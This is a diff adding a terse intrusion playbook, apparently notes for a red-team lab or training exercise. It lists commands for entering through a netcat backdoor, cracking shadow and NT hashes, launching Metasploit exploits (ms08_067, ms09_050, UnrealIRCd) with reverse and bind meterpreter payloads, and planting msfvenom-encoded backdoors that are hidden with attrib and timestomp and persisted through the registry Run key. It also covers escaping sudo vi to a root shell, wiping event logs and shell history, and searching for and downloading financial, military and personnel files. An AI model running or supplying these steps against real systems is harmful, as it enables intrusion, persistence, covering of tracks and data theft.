@@ -1,0 +1,194 @@
+<<<get on the redirector>>>
+ssh as root to kali
+nc -v <rdr_ip> 13 (backdoor)
+verify credentials
+ssh as root to rdr
+
+
+<<<situational awareness>>>
+uname -a
+id
+w
+ifconfig -a
+arp -a
+echo $SHELL
+history
+cd /tmp
+netstat -an (-antp)
+ps -elf
+date
+df -h
+lscpu
+pwd
+ls -latr
+cat /etc/crontab
+find / -name <name>
+cat /.bash_history
+
+
+<<<Solaris Redirector>>>
+sadmind
+target 1
+solaris/x86/shell_reverse_tcp
+/var/adm/messages
+/etc/services
+/etc/inetd.conf
+/sbin/daytime
+bash --login -i
+kill -HUP <pid>
+unset HISTFILE
+grep -v <ip> <file> > <tmp>
+touch -t <time> <file>
+
+
+<<<Info gathering>>>
+whois
+nslookup
+dig <FQDN>
+dig @<NS_IP> <DOMAIN> -t axfr
+
+
+<<<Credentials Linux>>>
+/etc/shadow
+/etc/passwd
+john <file>
+ssh root@<RDR_IP> -L <AP_PORT>:<TGT_IP>:<TGT_PORT> -R <RDR_LISTEN_PORT>:<0.0.0.0, AP_IP>:<AP_LISTEN_PORT>
+			LHOST		RPORT							LPORT			RHOST	
+
+<<<IP scan>>>
+-traceroute
+find / -name *.nse 2>/dev/null
+nmap (sweep) nmap -PI -sP -n -T4 <range>
+nmap (enum) nmap -PN -sV -n -O2 -T4 <single IP> --script=nbstat,netbios-smb-os-discovery
+finger -p79
+
+
+<<<Cisco Router>>>
+forward tunnel to port 80 as <TGT_PORT>
+http://<0.0.0.0>:<AP_PORT>/level/99/exec/sh
+sh conf
+sh process/cpu
+sh user/wide
+
+
+<<<Windows DMZ>>>
+Windows 2K8 - port 445 - ms09_050_smb2
+windows/meterpreter/reverse_tcp
+set a double ssh tunnel to use egress port
+run exploit
+
+
+<<<Windows Situational Awareness>>>
+sysinfo
+getuid
+ps
+route
+netstat
+net user
+qwinsta
+query user
+reg enumkey -k 'HKLM\software'
+reg queryval -k 'HKLM\software' -v '<value>'
+execute -c -f 'auditpol/get /category:*'
+net view /domain
+
+
+<<<Credentials Windows>>>
+hashdump
+john <file> --type=nt (windows)
+
+
+<<<Sustaining Access, backdoor (Windows Registry)>>>
+msfvenom -p windows/meterpreter/bind_tcp LPORT=<ACL_IN> -e x86/shikata_ga_nai -i 10 -f exe > winhlp16.exe
+cd c:\Windows
+upload winhlp16.exe
+attrib +s +h winhlp16.exe
+timestomp winhlp16.exe -f win.ini
+ssh root@<RDR_IP> -L <ACL_IN>:<TGT_IP>:<ACL_IN>
+msf>use multi/handler (set same payload and listening port)
+shell
+winhlp16.exe
+reg enumkey -k 'HKLM\software\microsoft\windows\currentversion\run'
+reg setval -k 'HKLM\software\microsoft\windows\currentversion\run' -v '<value>' -d '"C:\Windows\winhlp16.exe"'
+
+
+<<<Windows PrivEsc>>>
+getprivs
+getsystem -t 1
+steal_token <PID>
+drop_token
+getpid
+migrate <PID>
+tasklist /v | findstr <str>
+
+
+<<<Covering tracks (Windows)>>>
+Only 2K8 smb2 makes logs
+run event_manager -i
+run event_manager -l security -f 4625
+run event_manager -c security
+
+
+<<<Linux DMZ>>>
+unreal ircd
+6667
+cmd/unix/reverse payload
+
+
+<<<Sustaining Access, backdoor (Linux process)>>>
+/etc/sudoers group
+find / -perm -u=s -type f 2>/dev/null
+sudo -l
+sudo vi /root/group_notes
+:!/bin/bash
+chmod +x <file>
+msfvenom -p linux/x86/meterpreter/bind_tcp LPORT=<ACL_IN> -f elf > zdog
+ssh root@<RDR_IP> -L 22:<TGT_IP>:22
+scp zdog root@0.0.0.0:/tmp
+ssh root@0.0.0.0
+cd /tmp
+touch zdog -r zcat
+./zdog &
+netstat -antp | grep <ACL_IN>
+ssh root@<rdr_ip> -L <ACL_IN>:<TGT_IP>:<ACL_IN>
+msf > use multi/handler (same payload and port)
+
+
+<<<Linux Post, Auxiliary Modules, route statement, and scanning>>>
+post/multi/gather/ping_sweep
+auxiliary/scanner/portscan/tcp
+route print
+sessions
+route add 10.10.8.0 255.255.255.0 <session id>
+set threads 15
+auxiliary/scanner/smb/smb_version
+
+
+<<<OPTIONAL PORT FORWARD METHOD>>>
+portfwd add -l <ent_rhp> -r <TGT_IP> -p <vuln_port>
+in linux, shoot bind handler after one tunnel
+sessions -i <session #>
+portfwd flush
+portfwd add -l <tgt_listen_port> -r <TGT_IP> -p <tgt_listen_port>
+use multi/handler with same payload and <tgt_listen_port>
+
+
+<<<Covering tracks (Linux)>>>
+unset HISTFILE
+SYSLOG UDP 514
+
+<<<Internal Network Exploiting>>>
+Windows XP - port 135 - ms03_026_dcom 
+Windows Server 2K3 - port 445 - ms08_067_netapi
+windows/meterpreter/bind_tcp
+
+<<<Collection>>>
+arp -a
+nbtstat -A <ip>
+nmblookup -A <ip>
+dir /s /b "C:\*.<ext>" (financial, military, config, password, user, contact, personnel, employee, list, etc.)
+type "<filepath>"
+meterpreter > search -d '<path>' -f *.<ext>
+cat '<path>'
+download '<path>'
+find / -type f --mmin 15
